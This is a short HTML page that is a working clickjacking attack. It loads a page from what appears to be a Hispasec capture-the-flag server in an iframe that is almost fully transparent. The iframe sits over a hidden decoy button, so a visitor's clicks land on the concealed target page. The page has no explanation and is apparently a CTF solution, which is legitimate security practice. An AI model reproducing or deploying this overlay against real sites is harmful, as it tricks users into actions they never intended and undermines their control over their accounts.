<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="utf-8">
    <title>Soporte Libros - Final</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; }

        .wrapper {
            position: relative;
            width: 100%;
            height: 100%;
        }

       
        #objetivo {
            position: absolute;
            z-index: 1;
            top: 900px;  
            left: 50%;
            transform: translateX(-50%);
            width: 800px;
            height: 50px;
            background: transparent; 
            border: none;
            cursor: pointer;
        }

      
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 1200px;
            border: none;
            z-index: 2; 
            opacity: 0.0001; 
            pointer-events: auto; 
        }
    </style>
</head>
<body>

    <div class="wrapper">
        <button id="objetivo"></button>

        <iframe src="https://ctf.fap.hispasec.com:8018/books/1"></iframe>
    </div>

</body>
</html>
